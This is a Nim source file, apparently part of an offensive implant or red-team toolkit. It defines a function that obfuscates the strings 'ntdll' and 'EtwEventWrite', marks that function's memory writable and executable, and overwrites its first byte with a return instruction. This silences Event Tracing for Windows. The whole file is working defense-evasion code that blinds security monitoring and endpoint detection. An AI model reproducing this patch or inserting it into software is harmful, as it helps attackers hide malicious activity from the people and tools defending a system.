import winim/lean
import dynlib
import ../../util/strenc

# Patch ETW to stop event tracing
proc patchETW*(): int = 
    const
        patchBytes: array[1, byte] = [byte 0xc3]
    var
        ntdll: LibHandle
        patchAddress: pointer
        oldProtect: DWORD
        tmp: DWORD
        currentBytes: array[1, byte]

    ntdll = loadLib(obf("ntdll"))
    if isNil(ntdll):
        return 1 # ERR

    patchAddress = ntdll.symAddr(obf("EtwEventWrite"))
    if isNil(patchAddress):
        return 1 # ERR

    # Verify if ETW has already been patched
    copyMem(addr(currentBytes[0]), patchAddress, 1)
    if currentBytes == patchBytes:
        return 2 # Already patched

    if VirtualProtect(patchAddress, patchBytes.len, 0x40, addr oldProtect):
        copyMem(patchAddress, unsafeAddr patchBytes, patchBytes.len)
        VirtualProtect(patchAddress, patchBytes.len, oldProtect, addr tmp)
        return 0 # OK

    return 1 # ERR